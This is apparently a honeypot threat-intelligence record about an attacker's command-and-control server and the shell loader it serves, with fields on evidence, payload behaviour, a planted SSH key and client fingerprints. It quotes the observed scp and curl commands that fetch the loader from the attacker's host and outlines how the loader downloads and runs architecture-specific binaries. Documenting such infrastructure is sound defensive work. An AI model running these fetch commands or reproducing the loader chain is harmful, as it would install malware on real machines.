note: Attacker infrastructure observed on this honeypot. An address inside a payload URL is the attacker's own host, not a scanner's source; source addresses are never published. No attribution to a person is implied.

c2.evidence: fetched by a bot that planted an SSH key and ran 'scp dlr@217.60.102.5:sh', and separately by another host running 'curl -sk https://217.60.102.5/sh'
c2.serves: a shell loader (see payloads) and per-architecture binaries: /clean, /x86_64, /i686, /aarch64, /arm7, /riscv

ssh_keys.note: deployment key the loader wrote to key.ppk to reach the C2 above; the private half was captured and is not published

payloads.retrieved: MalwareBazaar, not observed on this sensor
payloads.behaviour: picks a hidden random filename (fallback literal '.redtail'), runs the C2's /clean, then downloads the binary matching 'uname -mp' from /x86_64, /i686, /aarch64, /arm7 or /riscv and executes it with the argument it was called with (e.g. 'telnet')

fingerprints.seen_on: 54 addresses across Datacamp Limited and Kyonix Networks
fingerprints.note: TLS client of the fleet that used the published AWS canary: 53 of the 64 addresses that swept the honeypot from one /24 present it, and it barely appears outside that fleet, so it identifies the client rather than a host
